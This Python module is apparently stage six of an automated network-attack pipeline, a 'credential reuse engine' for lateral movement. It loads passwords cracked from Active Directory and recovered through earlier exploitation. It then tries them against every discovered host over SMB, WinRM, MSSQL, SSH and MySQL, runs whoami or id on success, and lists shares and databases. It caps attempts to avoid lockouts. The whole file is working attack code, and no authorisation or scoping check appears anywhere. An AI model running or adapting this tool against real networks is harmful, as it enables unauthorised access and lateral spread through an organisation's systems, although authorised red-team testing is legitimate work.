"""
Stage 6: Credential Reuse Engine
Loads all credentials recovered in Stages 3 and 5, then tests each one
against every relevant service on every discovered host.

Rules enforced:
  - Max 3 reuse attempts per unique credential to avoid account lockout
  - Domain credentials -> SMB, WinRM, MSSQL on all Windows hosts
  - Local credentials  -> SSH on all Linux hosts
  - Database creds     -> MySQL on all database hosts
  - Only test when the target port is confirmed open in services.json
"""

import json
import os
import re
import socket
import pathlib
import tempfile

STATE_DIR = pathlib.Path("state")
LATERAL_JSON = STATE_DIR / "lateral.json"

# Port numbers that indicate a service is present
PORT_SMB    = 445
PORT_WINRM  = 5985
PORT_MSSQL  = 1433
PORT_SSH    = 22
PORT_MYSQL  = 3306

# OS keyword patterns that suggest Windows vs Linux
_WINDOWS_KEYWORDS = ("windows", "microsoft", "win32", "win64", "server 2")
_LINUX_KEYWORDS   = ("linux", "ubuntu", "debian", "centos", "fedora",
                     "rhel", "kali", "unix", "bsd")


# ---------------------------------------------------------------------------
# Helper: read a JSON state file gracefully
# ---------------------------------------------------------------------------

def _load_json(path: pathlib.Path) -> dict | list | None:
    try:
        return json.loads(path.read_text())
    except (FileNotFoundError, json.JSONDecodeError):
        return None


# ---------------------------------------------------------------------------
# Helper: check whether a port is open on a host according to services.json
# ---------------------------------------------------------------------------

def _port_open(host_entry: dict, port: int) -> bool:
    for p in host_entry.get("ports", []):
        if p.get("port") == port and p.get("state") == "open":
            return True
    return False


# ---------------------------------------------------------------------------
# Helper: classify OS
# ---------------------------------------------------------------------------

def _is_windows(host_entry: dict) -> bool:
    guess = (host_entry.get("os_guess") or "").lower()
    if any(k in guess for k in _WINDOWS_KEYWORDS):
        return True
    # Fallback: SMB open without SSH strongly implies Windows
    if _port_open(host_entry, PORT_SMB) and not _port_open(host_entry, PORT_SSH):
        return True
    return False


def _is_linux(host_entry: dict) -> bool:
    guess = (host_entry.get("os_guess") or "").lower()
    if any(k in guess for k in _LINUX_KEYWORDS):
        return True
    # Fallback: SSH open without SMB strongly implies Linux/Unix
    if _port_open(host_entry, PORT_SSH) and not _port_open(host_entry, PORT_SMB):
        return True
    return False


def _is_database_host(host_entry: dict) -> bool:
    return _port_open(host_entry, PORT_MYSQL)


# ---------------------------------------------------------------------------
# Credential collection
# ---------------------------------------------------------------------------

def _collect_credentials(
    ad_findings: dict | None,
    exploitation: dict | None,
) -> list[dict]:
    """
    Return a deduplicated list of credential dicts.
    Each dict has at minimum: username, password (may be empty string).
    Optional keys: domain, source_host, hash (NTLM).
    """
    seen: set[tuple] = set()
    creds: list[dict] = []

    def _add(cred: dict) -> None:
        key = (
            (cred.get("username") or "").lower(),
            cred.get("password") or "",
            (cred.get("domain") or "").lower(),
        )
        if key not in seen:
            seen.add(key)
            creds.append(cred)

    # Stage 3: ad_findings.json -> cracked_credentials
    if ad_findings:
        for c in ad_findings.get("cracked_credentials", []):
            _add({
                "username":    c.get("username", ""),
                "password":    c.get("password", ""),
                "domain":      c.get("domain", ""),
                "source_host": ad_findings.get("dc_ip", ""),
            })

    # Stage 5: exploitation.json -> each result's credentials_recovered
    if exploitation:
        for result in exploitation.get("results", []):
            source = result.get("host", "")
            for c in result.get("credentials_recovered", []):
                _add({
                    "username":    c.get("username", ""),
                    "password":    c.get("password", ""),
                    "domain":      c.get("domain", ""),
                    "hash":        c.get("hash", ""),
                    "source_host": source,
                })

    return creds


# ---------------------------------------------------------------------------
# SMB reuse via impacket SMBConnection
# ---------------------------------------------------------------------------

def _try_smb(host: str, username: str, password: str, domain: str) -> tuple[bool, str]:
    """
    Attempt SMB login. Returns (success, evidence_string).
    """
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(host, host, sess_port=PORT_SMB, timeout=10)
        conn.login(username, password, domain)
        # Enumerate shares as evidence
        try:
            shares = conn.listShares()
            share_names = [s["shi1_netname"][:-1] for s in shares]
            evidence = f"SMB login succeeded as {domain}\\{username}; shares: {share_names}"
        except Exception:
            evidence = f"SMB login succeeded as {domain}\\{username}"
        conn.logoff()
        return True, evidence
    except Exception as exc:
        return False, str(exc)


# ---------------------------------------------------------------------------
# WinRM reuse via pywinrm
# ---------------------------------------------------------------------------

def _try_winrm(host: str, username: str, password: str, domain: str) -> tuple[bool, str]:
    """
    Attempt WinRM login and run 'whoami'. Returns (success, evidence_string).
    """
    try:
        import winrm  # type: ignore
        # Build the user string - domain\user or just user
        win_user = f"{domain}\\{username}" if domain else username
        session = winrm.Session(
            f"http://{host}:{PORT_WINRM}/wsman",
            auth=(win_user, password),
            transport="ntlm",
            read_timeout_sec=15,
            operation_timeout_sec=12,
        )
        result = session.run_cmd("whoami")
        output = (result.std_out or b"").decode(errors="replace").strip()
        if result.status_code == 0 and output:
            return True, f"WinRM whoami: {output}"
        return False, f"WinRM returned status {result.status_code}"
    except Exception as exc:
        return False, str(exc)


# ---------------------------------------------------------------------------
# MSSQL reuse via pymssql (optional) or socket probe
# ---------------------------------------------------------------------------

def _try_mssql(host: str, username: str, password: str, domain: str) -> tuple[bool, str]:
    """
    Attempt MSSQL login using pymssql if available, else declare untested.
    Returns (success, evidence_string).
    """
    try:
        import pymssql  # type: ignore
        conn = pymssql.connect(
            server=host,
            user=f"{domain}\\{username}" if domain else username,
            password=password,
            database="master",
            timeout=10,
            login_timeout=10,
        )
        cursor = conn.cursor()
        cursor.execute("SELECT @@VERSION")
        row = cursor.fetchone()
        evidence = f"MSSQL login succeeded; version: {row[0][:80] if row else 'unknown'}"
        conn.close()
        return True, evidence
    except ImportError:
        return False, "pymssql not installed; MSSQL test skipped"
    except Exception as exc:
        return False, str(exc)


# ---------------------------------------------------------------------------
# SSH reuse via paramiko
# ---------------------------------------------------------------------------

def _try_ssh(host: str, username: str, password: str) -> tuple[bool, str]:
    """
    Attempt SSH login and run 'id && hostname'. Returns (success, evidence_string).
    """
    try:
        import paramiko
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(
            host,
            port=PORT_SSH,
            username=username,
            password=password,
            timeout=5,
            banner_timeout=8,
            auth_timeout=8,
            look_for_keys=False,
            allow_agent=False,
        )
        _stdin, stdout, _stderr = client.exec_command("id && hostname", timeout=8)
        output = stdout.read().decode(errors="replace").strip()
        client.close()
        return True, f"SSH login succeeded as {username}; {output}"
    except Exception as exc:
        return False, str(exc)


# ---------------------------------------------------------------------------
# MySQL reuse via pymysql
# ---------------------------------------------------------------------------

def _try_mysql(host: str, username: str, password: str) -> tuple[bool, str]:
    """
    Attempt MySQL login. Returns (success, evidence_string).
    """
    try:
        import pymysql  # type: ignore
        conn = pymysql.connect(
            host=host,
            user=username,
            password=password,
            connect_timeout=5,
        )
        cursor = conn.cursor()
        cursor.execute("SHOW DATABASES")
        dbs = [row[0] for row in cursor.fetchall()]
        conn.close()
        return True, f"MySQL login succeeded as {username}; databases: {dbs}"
    except Exception as exc:
        return False, str(exc)


# ---------------------------------------------------------------------------
# Core reuse loop
# ---------------------------------------------------------------------------

def run() -> list[dict]:
    """
    Main entry point. Loads all state files, iterates credentials against
    all valid target/service combinations, writes state/lateral.json, and
    returns the list of reuse_events.
    """
    STATE_DIR.mkdir(exist_ok=True)

    # Load upstream state files
    ad_findings  = _load_json(STATE_DIR / "ad_findings.json")
    exploitation = _load_json(STATE_DIR / "exploitation.json")
    services     = _load_json(STATE_DIR / "services.json")

    if not services:
        print("[reuse] ERROR: state/services.json not found or unreadable — nothing to do.")
        return []

    hosts: list[dict] = services.get("hosts", [])
    credentials = _collect_credentials(ad_findings, exploitation)

    if not credentials:
        print("[reuse] No credentials available for reuse testing.")
        _write_lateral([])
        return []

    print(f"[reuse] Loaded {len(credentials)} unique credential(s), {len(hosts)} host(s).")

    # Per-credential attempt counter  key: (username.lower(), password, domain.lower())
    attempt_count: dict[tuple, int] = {}
    MAX_ATTEMPTS = 3

    reuse_events: list[dict] = []

    for cred in credentials:
        username    = cred.get("username", "")
        password    = cred.get("password", "")
        domain      = cred.get("domain", "")
        source_host = cred.get("source_host", "unknown")
        is_domain   = bool(domain)

        cred_key = (username.lower(), password, domain.lower())
        display  = f"{domain}\\{username}" if domain else username

        for host_entry in hosts:
            target_ip = host_entry.get("ip", "")

            # Never reuse a credential against the host it came from
            # (the source is already confirmed; retesting wastes an attempt)
            if target_ip == source_host:
                continue

            # ---- Domain credentials -> SMB, WinRM, MSSQL (Windows targets) ----
            if is_domain and _is_windows(host_entry):

                if _port_open(host_entry, PORT_SMB):
                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
                        print(f"[reuse] Testing {display}:{password} against {target_ip} SMB...")
                        ok, evidence = _try_smb(target_ip, username, password, domain)
                        reuse_events.append({
                            "credential":  {"username": username, "password": password, "domain": domain},
                            "source_host": source_host,
                            "target_host": target_ip,
                            "service":     "smb",
                            "success":     ok,
                            "evidence":    evidence,
                        })
                        if ok:
                            print(f"[reuse]   SUCCESS: {evidence}")

                if _port_open(host_entry, PORT_WINRM):
                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
                        print(f"[reuse] Testing {display}:{password} against {target_ip} WinRM...")
                        ok, evidence = _try_winrm(target_ip, username, password, domain)
                        reuse_events.append({
                            "credential":  {"username": username, "password": password, "domain": domain},
                            "source_host": source_host,
                            "target_host": target_ip,
                            "service":     "winrm",
                            "success":     ok,
                            "evidence":    evidence,
                        })
                        if ok:
                            print(f"[reuse]   SUCCESS: {evidence}")

                if _port_open(host_entry, PORT_MSSQL):
                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
                        print(f"[reuse] Testing {display}:{password} against {target_ip} MSSQL...")
                        ok, evidence = _try_mssql(target_ip, username, password, domain)
                        reuse_events.append({
                            "credential":  {"username": username, "password": password, "domain": domain},
                            "source_host": source_host,
                            "target_host": target_ip,
                            "service":     "mssql",
                            "success":     ok,
                            "evidence":    evidence,
                        })
                        if ok:
                            print(f"[reuse]   SUCCESS: {evidence}")

            # ---- Local (non-domain) credentials -> SSH (Linux targets) ----
            elif not is_domain and _is_linux(host_entry):

                if _port_open(host_entry, PORT_SSH):
                    if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
                        attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
                        print(f"[reuse] Testing {username}:{password} against {target_ip} SSH...")
                        ok, evidence = _try_ssh(target_ip, username, password)
                        reuse_events.append({
                            "credential":  {"username": username, "password": password},
                            "source_host": source_host,
                            "target_host": target_ip,
                            "service":     "ssh",
                            "success":     ok,
                            "evidence":    evidence,
                        })
                        if ok:
                            print(f"[reuse]   SUCCESS: {evidence}")

            # ---- Database credentials -> MySQL (database hosts) ----
            if _is_database_host(host_entry) and _port_open(host_entry, PORT_MYSQL):
                if attempt_count.get(cred_key, 0) < MAX_ATTEMPTS:
                    attempt_count[cred_key] = attempt_count.get(cred_key, 0) + 1
                    print(f"[reuse] Testing {username}:{password} against {target_ip} MySQL...")
                    ok, evidence = _try_mysql(target_ip, username, password)
                    reuse_events.append({
                        "credential":  {"username": username, "password": password},
                        "source_host": source_host,
                        "target_host": target_ip,
                        "service":     "mysql",
                        "success":     ok,
                        "evidence":    evidence,
                    })
                    if ok:
                        print(f"[reuse]   SUCCESS: {evidence}")

    successes = sum(1 for e in reuse_events if e["success"])
    print(f"[reuse] Done. {len(reuse_events)} test(s) run, {successes} successful.")

    _write_lateral(reuse_events)
    return reuse_events


# ---------------------------------------------------------------------------
# Atomic write
# ---------------------------------------------------------------------------

def _write_lateral(reuse_events: list[dict]) -> None:
    STATE_DIR.mkdir(exist_ok=True)
    payload = json.dumps({"reuse_events": reuse_events}, indent=2)
    tmp = LATERAL_JSON.with_suffix(".tmp")
    tmp.write_text(payload)
    tmp.rename(LATERAL_JSON)
    print(f"[reuse] state/lateral.json written ({len(reuse_events)} event(s)).")


# ---------------------------------------------------------------------------
# CLI entry point (for standalone testing)
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    events = run()
    successes = [e for e in events if e["success"]]
    print(f"\nSummary: {len(successes)}/{len(events)} reuse attempts succeeded.")
    for e in successes:
        cred = e["credential"]
        u = cred.get("username", "")
        d = cred.get("domain", "")
        label = f"{d}\\{u}" if d else u
        print(f"  {label} -> {e['target_host']} via {e['service']}: {e['evidence'][:120]}")
